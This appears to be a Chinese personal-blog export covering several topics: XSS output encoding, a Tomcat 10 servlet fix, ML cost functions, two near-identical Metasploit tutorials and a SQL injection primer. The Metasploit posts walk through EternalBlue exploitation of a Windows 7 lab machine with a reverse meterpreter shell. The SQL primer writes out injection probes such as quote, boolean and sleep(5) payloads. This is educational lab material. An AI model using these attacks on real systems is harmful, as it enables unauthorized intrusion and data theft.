<h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>字符串js编码转换成实体html编码的方法（防范XSS攻击）</p>
<h2 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>OWASP-TOP10</tag>
      </tags>
  </entry>
  <entry>
    <title>Servlet实例化异常解决办法</title>
    <url>/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><blockquote>
<p>系统环境：IDEA 2021.2，Tomcat 10</p>
</blockquote>
<p>  在IDEA中配置好Servlet文件路径，项目结构如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-10-12.png"></p>
<p>Tomcat配置如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-11-18.png"></p>
<p>以ch07_8_tijiao.jsp为例，运行后第一个界面显示正常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-22-36.png"></p>
<p>但当输入2个数据并点击提交后，servlet出现实例化异常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-24-22.png"></p>
<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>项目结构’web-lib’中导入Tomcat的Tomcat-api.jar包以及servlet-api.jar包，并导入进项目库中</p>
<div align="center">

<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-28-44.png"></p>
</div>

<p>如果Tomcat版本为10.0以下时，做完上面步骤问题消失，可以正常运行，<br>但当Tomcat版本为10.0时，仍然会显示实例化异常，<br>根本原因是Tomcat 10的servlet-api中并非旧版本的javax.servlet，而是jakarta.servlet，<br>此时需要将项目src目录下的java源文件中import javax.servlet全部改为jakarta.servlet，保存后即可正常运行</p>
<blockquote>
<p>源代码：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>修改后：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-27-19-25-20.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-35.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-59.png"></p>
]]></content>
      <categories>
        <category>Java EE</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/09/25/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>代价函数</title>
    <url>/2022/10/11/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/ApplicationFrameHost_Gvqy4wLebk.png"></p>
<blockquote>
<p>代价函数（Cost Function）在机器学习中的每一种算法中都很重要，因为训练模型的过程就是优化代价函数的过程，代价函数对每个参数的偏导数就是梯度下降中提到的梯度，防止过拟合时添加的正则化项也是加在代价函数后面的</p>
</blockquote>
<div>
<h1><font color="CadetBlue">1.什么是代价函数</font>
</h1>
</div>

<p>        概况来讲，任何能够衡量模型预测出来的值h(θ)与真实值y之间的差异的函数都可以叫做代价函数J(θ)。</p>
<p>        代价函数就是用于找到最优解的目的函数，这也是代价函数的作用。</p>
<p>　　<strong><mark>损失函数（Loss Function ）</mark></strong> 是定义在单个样本上的，算的是一个样本的误差。</p>
<p>　　<strong><mark>代价函数（Cost Function ）</mark></strong> 是定义在整个训练集上的，是所有样本误差的平均，也就是损失函数的平均。</p>
<p>　　<strong><mark>目标函数（Object Function）</mark></strong> 定义为：最终需要优化的函数。等于经验风险+结构风险（也就是Cost Function + 正则化项）。</p>
<div>
<h1><font color="CadetBlue">2.代价函数的作用是什么</font>
</h1>
</div>

<p>        假设，给定一个关于 <code>x</code>  和 <code>y</code>  的数据集，该数据集可以被认定为一个线性回归模型，设定假象函数 : <font color="DeepSkyBlue">f<sub>w,b</sub></font> (x) &#x3D; <font color="DeepSkyBlue">w</font>x + <font color="DeepSkyBlue">b</font> </p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_bS2PBfg7tJ.png" title alt data-align="center">

<p>        当函数中 <code>w</code>  和 <code>b</code>  两个参数发生改变时，函数也会偏离或者靠近数据集，为了使假象函数跟接近于真实的目标函数或更能使其正确的表示这个数据集，此时就可以引入代价函数</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_PNGYjBNfTI.png" title alt data-align="center">

<p>        以平方误差代价函数为例，从最简单的单一参数来看，假设函数为：J<sub>w</sub> &#x3D; wx，平方误差代价函数的主要思想就是将实际数据给出的值与我们拟合出的线的对应值做差，求出我们拟合出的直线与实际的差距。</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_QKEXlhGUBk.png" title alt data-align="center">

<p>        为了使这个值不受个别极端数据影响而产生巨大波动，采用类似方差再取二分之一的方式来减小个别数据的影响。这样，就产生了代价函数：</p>
<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_dfDTIpbfSv.png" alt width="394" data-align="center">

<p>将其扩充成2个参数，就变成了<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_DkMygOkPLc.png" alt width="247" data-align="inline"></p>
]]></content>
      <categories>
        <category>机器深度学习Deeplearning.AI</category>
      </categories>
      <tags>
        <tag>AI理论基础</tag>
      </tags>
  </entry>
  <entry>
    <title>初始Metasploit</title>
    <url>/2023/04/02/%E5%88%9D%E5%A7%8BMetasploit-1/</url>
    <content><![CDATA[<p>环境：</p>
<p>攻击机：Kali Linux</p>
<p>受害机：Windows 7</p>
<h1 id="什么是-Metasploit"><a href="#什么是-Metasploit" class="headerlink" title="什么是 Metasploit"></a>什么是 Metasploit</h1><p>    这是一个免费的、开源的渗透测试框架，由 H.D.Moore 在 2003 年发布，后来被 Rapid7 收购。Metasploit 核心中绝大部分有 Rudy 实现，一小部分由汇编和C语言实现。</p>
<h1 id="为什么要用-Metasploit"><a href="#为什么要用-Metasploit" class="headerlink" title="为什么要用 Metasploit"></a>为什么要用 Metasploit</h1><ol>
<li><p>效率：Metasploit 提供了一系列已经开发好的攻击模块，使得攻击者能够快速地在目标系统上执行攻击，同时减少了犯错的机会。</p>
</li>
<li><p>易用性：Metasploit 使用简单，用户无需具备深入的技术知识，只需了解一些基本的操作就能使用它进行渗透测试。</p>
</li>
<li><p>支持多种操作系统：Metasploit 支持多种操作系统，包括 Windows、Linux、macOS等，因此，它可以用于攻击各种不同的目标系统。</p>
</li>
<li><p>兼容性：Metasploit 兼容多种漏洞扫描工具和其他渗透测试工具，使得用户可以将其集成到他们的工具链中。</p>
</li>
<li><p>实用性：Metasploit 具有强大的漏洞利用功能，可以进行端口扫描、漏洞扫描、漏洞利用等，从而帮助用户发现和利用系统中的漏洞。</p>
</li>
</ol>
<h1 id="如何使用-Metasploit"><a href="#如何使用-Metasploit" class="headerlink" title="如何使用 Metasploit"></a>如何使用 Metasploit</h1><h2 id="Metasploit的模块"><a href="#Metasploit的模块" class="headerlink" title="Metasploit的模块"></a>Metasploit的模块</h2><ol>
<li><p>扫描模块（Scanning modules）：用于发现目标系统的开放端口和漏洞，常见的扫描模块包括nmap、arp_scanner、ping_sweep等。</p>
</li>
<li><p>渗透模块（Exploit modules）：用于利用目标系统的漏洞进行攻击，以获取系统权限或者执行命令，常见的渗透模块包括MS08_067_netapi、MS17_010_eternalblue等。</p>
</li>
<li><p>模块辅助（Auxiliary modules）：提供一些辅助功能，如指纹识别、密码破解、后门创建等，常见的辅助模块包括enum、ftp_login、smb_login等。</p>
</li>
<li><p>转发模块（Payload modules）：用于在攻击成功后提供一个交互式的shell，以执行更复杂的攻击，常见的转发模块包括meterpreter_reverse_tcp、meterpreter_reverse_http等。</p>
</li>
<li><p>木马模块（Shellcode modules）：用于创建一些自定义的木马程序，可以绕过一些安全措施，常见的木马模块包括windows&#x2F;meterpreter&#x2F;reverse_https、windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp等</p>
</li>
</ol>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>    扫描模块是Metasploit中的一类模块，用于发现目标系统的开放端口和漏洞。以下是一些常见的扫描模块及其功能：</p>
<ol>
<li><p>Nmap扫描模块：Nmap是一个开源的端口扫描工具，Metasploit中的nmap模块可以调用Nmap的功能，扫描目标系统的开放端口，以及判断操作系统、服务和应用程序版本等信息。</p>
</li>
<li><p>Ping扫描模块：ping_sweep模块可以通过发送ICMP包来扫描目标系统是否在线，快速确定目标的IP地址是否可用。</p>
</li>
<li><p>ARP扫描模块：arp_scanner模块可以通过发送ARP包来扫描目标局域网上的主机，快速获取局域网内的主机IP和MAC地址。</p>
</li>
<li><p>SMB扫描模块：smb_version模块可以利用SMB协议获取目标系统上共享文件夹的信息，包括共享文件夹名称、操作系统版本等。</p>
</li>
<li><p>Web应用程序扫描模块：Metasploit中的web_app_scanner模块可以扫描目标Web应用程序的漏洞，包括SQL注入、XSS漏洞等。</p>
</li>
</ol>
<h4 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h4><p>    以 Nmap 为例，查看受害机的 IP，攻击机测试连通性，结果可以 PING 通，进行下一步</p>
<p>    <img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021415267.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021419931.png"></p>
<p>    使用nmap [ 受害机 IP ] 查看受害机开放的端口以及对应的服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021421460.png"></p>
<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>    Metasploit渗透模块是用于利用已知漏洞或弱点对目标系统进行攻击的工具。以下是几个常用的渗透模块及其功能：</p>
<ol>
<li><p>exploit：用于执行针对已知漏洞的攻击，例如远程代码执行、缓冲区溢出、文件包含等。使用这个模块可以获取对目标系统的完全控制。</p>
</li>
<li><p>payload：用于在目标系统上执行特定的操作，例如打开反向shell、上传&#x2F;下载文件、添加管理员账户等。这个模块的功能取决于攻击者的目的和实际需求。</p>
</li>
<li><p>auxiliary：用于执行非攻击性任务的模块，例如端口扫描、漏洞扫描、密码爆破、信息收集等。这个模块通常用于获取目标系统的信息，以便为后续攻击做准备。</p>
</li>
<li><p>post：用于在攻击成功后对目标系统进行后续操作的模块，例如上传后门、获取系统信息、清除痕迹等。这个模块通常用于长期攻击和渗透，以保持对目标系统的持续访问。</p>
</li>
</ol>
<h4 id="Example：-1"><a href="#Example：-1" class="headerlink" title="Example："></a>Example：</h4><p>    以永恒之蓝为例，搜索永恒之蓝漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021501597.png"></p>
<p>    使用探测模块 auxiliary ，show options 命令查看所需的参数，默认必填参数中只有RHOSTS 没有补充，RHOSTS 为被攻击的主机IP，RPORT 为端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021503166.png"></p>
<p>    配置RHOSTS，使用set RHOSTS [ IP ]</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021506629.png"></p>
<p>    run指令进行探测，[+] 为探测到的结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021507879.png"></p>
<p>    接下来可以使用 exploit 模块进行攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021510647.png"> <img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021510939.png"></p>
<p>    RHOSTS 为被攻击机的 IP，LHOST , LPORT 为监听主机的 IP 和端口号，设置完成后使用RUN 指令进行攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021512392.png"></p>
<h4 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h4><p>    运行了完命令之后，我们开启了一个 reverse TCP 监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell  即可切换到目标主机的windows shell，要想从目标主机 shell 退出到 meterpreter ，我们只需输入：exit 。也可以使用其他指令进行更多操作。（ 例如使用 upload 指令上传文件到被攻击机 ）</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021515274.png"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali - 初识Metasploit</title>
    <url>/2023/04/01/%E5%88%9D%E5%A7%8BMetasploit/</url>
    <content><![CDATA[<p>环境：</p>
<p>攻击机：Kali Linux</p>
<p>受害机：Windows 7</p>
<h1 id="什么是-Metasploit"><a href="#什么是-Metasploit" class="headerlink" title="什么是 Metasploit"></a><font color="CornflowerBlue">什么是 Metasploit</font></h1><p>    这是一个免费的、开源的渗透测试框架，由 H.D.Moore 在 2003 年发布，后来被 Rapid7 收购。Metasploit 核心中绝大部分有 Rudy 实现，一小部分由汇编和C语言实现。</p>
<h1 id="为什么要用-Metasploit"><a href="#为什么要用-Metasploit" class="headerlink" title="为什么要用 Metasploit"></a><font color="SkyBlue">为什么要用 Metasploit</font></h1><ol>
<li><p>效率：Metasploit 提供了一系列已经开发好的攻击模块，使得攻击者能够快速地在目标系统上执行攻击，同时减少了犯错的机会。</p>
</li>
<li><p>易用性：Metasploit 使用简单，用户无需具备深入的技术知识，只需了解一些基本的操作就能使用它进行渗透测试。</p>
</li>
<li><p>支持多种操作系统：Metasploit 支持多种操作系统，包括 Windows、Linux、macOS等，因此，它可以用于攻击各种不同的目标系统。</p>
</li>
<li><p>兼容性：Metasploit 兼容多种漏洞扫描工具和其他渗透测试工具，使得用户可以将其集成到他们的工具链中。</p>
</li>
<li><p>实用性：Metasploit 具有强大的漏洞利用功能，可以进行端口扫描、漏洞扫描、漏洞利用等，从而帮助用户发现和利用系统中的漏洞。</p>
</li>
</ol>
<h1 id="如何使用-Metasploit"><a href="#如何使用-Metasploit" class="headerlink" title="如何使用 Metasploit"></a><font color="PaleTurquoise">如何使用 Metasploit</font></h1><h2 id="Metasploit的模块"><a href="#Metasploit的模块" class="headerlink" title="Metasploit的模块"></a>Metasploit的模块</h2><ol>
<li><p>扫描模块（Scanning modules）：用于发现目标系统的开放端口和漏洞，常见的扫描模块包括nmap、arp_scanner、ping_sweep等。</p>
</li>
<li><p>渗透模块（Exploit modules）：用于利用目标系统的漏洞进行攻击，以获取系统权限或者执行命令，常见的渗透模块包括MS08_067_netapi、MS17_010_eternalblue等。</p>
</li>
<li><p>模块辅助（Auxiliary modules）：提供一些辅助功能，如指纹识别、密码破解、后门创建等，常见的辅助模块包括enum、ftp_login、smb_login等。</p>
</li>
<li><p>转发模块（Payload modules）：用于在攻击成功后提供一个交互式的shell，以执行更复杂的攻击，常见的转发模块包括meterpreter_reverse_tcp、meterpreter_reverse_http等。</p>
</li>
<li><p>木马模块（Shellcode modules）：用于创建一些自定义的木马程序，可以绕过一些安全措施，常见的木马模块包括windows&#x2F;meterpreter&#x2F;reverse_https、windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp等</p>
</li>
</ol>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>    扫描模块是Metasploit中的一类模块，用于发现目标系统的开放端口和漏洞。以下是一些常见的扫描模块及其功能：</p>
<ol>
<li><p>Nmap扫描模块：Nmap是一个开源的端口扫描工具，Metasploit中的nmap模块可以调用Nmap的功能，扫描目标系统的开放端口，以及判断操作系统、服务和应用程序版本等信息。</p>
</li>
<li><p>Ping扫描模块：ping_sweep模块可以通过发送ICMP包来扫描目标系统是否在线，快速确定目标的IP地址是否可用。</p>
</li>
<li><p>ARP扫描模块：arp_scanner模块可以通过发送ARP包来扫描目标局域网上的主机，快速获取局域网内的主机IP和MAC地址。</p>
</li>
<li><p>SMB扫描模块：smb_version模块可以利用SMB协议获取目标系统上共享文件夹的信息，包括共享文件夹名称、操作系统版本等。</p>
</li>
<li><p>Web应用程序扫描模块：Metasploit中的web_app_scanner模块可以扫描目标Web应用程序的漏洞，包括SQL注入、XSS漏洞等。</p>
</li>
</ol>
<h4 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h4><p>    以 Nmap 为例，查看受害机的 IP，攻击机测试连通性，结果可以 PING 通，进行下一步</p>
<p>    <img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021415267.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021419931.png"></p>
<p>    使用nmap [ 受害机 IP ] 查看受害机开放的端口以及对应的服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021421460.png"></p>
<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>    Metasploit渗透模块是用于利用已知漏洞或弱点对目标系统进行攻击的工具。以下是几个常用的渗透模块及其功能：</p>
<ol>
<li><p>exploit：用于执行针对已知漏洞的攻击，例如远程代码执行、缓冲区溢出、文件包含等。使用这个模块可以获取对目标系统的完全控制。</p>
</li>
<li><p>payload：用于在目标系统上执行特定的操作，例如打开反向shell、上传&#x2F;下载文件、添加管理员账户等。这个模块的功能取决于攻击者的目的和实际需求。</p>
</li>
<li><p>auxiliary：用于执行非攻击性任务的模块，例如端口扫描、漏洞扫描、密码爆破、信息收集等。这个模块通常用于获取目标系统的信息，以便为后续攻击做准备。</p>
</li>
<li><p>post：用于在攻击成功后对目标系统进行后续操作的模块，例如上传后门、获取系统信息、清除痕迹等。这个模块通常用于长期攻击和渗透，以保持对目标系统的持续访问。</p>
</li>
</ol>
<h4 id="Example：-1"><a href="#Example：-1" class="headerlink" title="Example："></a>Example：</h4><p>    以永恒之蓝为例，搜索永恒之蓝漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021501597.png"></p>
<p>    使用探测模块 auxiliary ，show options 命令查看所需的参数，默认必填参数中只有RHOSTS 没有补充，RHOSTS 为被攻击的主机IP，RPORT 为端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021503166.png"></p>
<p>    配置RHOSTS，使用set RHOSTS [ IP ]</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021506629.png"></p>
<p>    </p>
<p>    run指令进行探测，[+] 为探测到的结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021507879.png"></p>
<p>    接下来可以使用 exploit 模块进行攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021510647.png"><br><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021510939.png"></p>
<p>    RHOSTS 为被攻击机的 IP，LHOST , LPORT 为监听主机的 IP 和端口号，设置完成后使用RUN 指令进行攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021512392.png"></p>
<h4 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h4><p>    运行了完命令之后，我们开启了一个 reverse TCP 监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell  即可切换到目标主机的windows shell，要想从目标主机 shell 退出到 meterpreter ，我们只需输入：exit 。也可以使用其他指令进行更多操作。（ 例如使用 upload 指令上传文件到被攻击机 ）</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021515274.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304021517944.png"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>初识SQL注入--小结</title>
    <url>/2023/04/02/%E5%88%9D%E8%AF%86SQL%E6%B3%A8%E5%85%A5-%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><p>sql注入是指web应用程序对用户输入数据的合法性没有进行判断或者过滤不严，导致攻击者可以构造恶意语句，获取数据库中的数据，在一定条件下甚至可以拿到shell</p>
<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>mysql5.0以上存在一个自带的数据库名为 <strong>information__schema</strong> ,是一个存储纪录了所有数据库名、表名、列名的数据库，也相当于可以从这里查询指定数据库下面的表名和列名的信息，这是因为在数据库中”.”表示下一级。例如：books.book 表示 books 数据库下面的book 表名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">information_schema.schemata：纪录所有数据库的表</span><br><span class="line">information_schema.<span class="keyword">tables</span>：纪录所有表名的表</span><br><span class="line">information_schema.<span class="keyword">columns</span>；纪录所有列名的表</span><br><span class="line">相当于变量：</span><br><span class="line"><span class="built_in">table_name</span>:表名</span><br><span class="line"><span class="built_in">column_name</span>:列名</span><br><span class="line">table_schema:数据库名</span><br></pre></td></tr></table></figure>

<h1 id="Step-1-判断"><a href="#Step-1-判断" class="headerlink" title="Step 1. 判断"></a>Step 1. 判断</h1><h2 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h2><p>首先需要判断注入点是否存在，如果在页面的url中存在某些参数，比如下面这个URL中就存在一个id参数：<a href="http://xxxxx.xxx/?id=1">http://xxxxx.xxx/?id=1</a></p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101355731.png" title alt data-align="center">

<p>就可以尝试改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。</p>
<p>猜测查询的SQL语句大致为：</p>
<p><code>select * from [表名] where id = 1;</code></p>
<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>在id后面跟一个单引号进行尝试，发现报错信息为 <code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> ，去掉报错信息本身的左右单引号，为 <code>&#39;1&#39;&#39; LIMIT 0,1</code> ，发现1的左方1个单引号，右方2个单引号。可以判断出SQL语句为<code>select * from [表名] where id = ’1‘  LIMIT 0,1;</code> </p>
<p>报错信息分析：因为我们在id后多跟了一个单引号，导致查询语句在id后闭合，后续内容无法正常执行，所以出现这个报错</p>
<p>由此判断id的接受类型为字符型</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101358449.png" title alt data-align="center">

<h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>判断是否为数字型依然选择添加单引号测试，发现报错结果为 <code>&#39;&#39; LIMIT 0,1&#39;</code> ，去除报错信息本身的左右单引号，为 <code>&#39; LIMIT 0,1</code> ，说明跟在id后的单引号多余，导致查询语句无法执行</p>
<p>报错信息分析：传入的参数前面并没有引号包裹，多出的单引号导致语句异常</p>
<p>由此判断id的接受类型为数字型</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101410758.png" title alt data-align="center">

<h3 id="添加单引号"><a href="#添加单引号" class="headerlink" title="添加单引号"></a>添加单引号</h3><p>添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。</p>
<h3 id="添加逻辑运算"><a href="#添加逻辑运算" class="headerlink" title="添加逻辑运算"></a>添加逻辑运算</h3><p>添加 <code>and 1 = 1</code> 和 <code>and 1 = 2</code> </p>
<p>在添加逻辑运算之前我们需要判断或者猜测注入点的数据类型和闭合方式，并对语句进行相应的引号、括号闭合。</p>
<p>比如字符型我们可以直接添加and 1&#x3D;1 ，而单验号闭合的字符型我们就需要添加 <code>&#39;and &#39;1&#39;=1</code> ，或 <code>&#39;and &#39;1&#39;=1&#39; #</code> 使用注释符号将后面的引号直接注释掉。</p>
<p>添加了逻辑运算符之后提交，因为 1&#x3D;1 恒为真，而 1&#x3D;2 恒为假，所以如果我们的输入带入了数据库，一定会影响到 SQL 语句的布尔状态，如果两次查询返回的页面不同，说明页面存在布尔状态，此处存在注入漏洞，可以考虑使用布尔盲注进行注入。</p>
<h3 id="添加sleep-函数"><a href="#添加sleep-函数" class="headerlink" title="添加sleep( )函数"></a>添加sleep( )函数</h3><p><code>sleep()</code> 函数可以让程序在当前位置停留指定的时间，于是我们可以通过观察页面相应的时间来判断我们插入的参数是否会被带入数据库执行。</p>
<p>在参数后添加 <code>and sleep(5)</code> 然后观察页面响应时间是否明显变长，或直接在开发者工具中网络选项卡下观察页面的响应时间。如果页面响应时间确实按照我们的要求增加了5秒，则说明此处存在注入漏洞，我们可以考虑通过延时注入。</p>
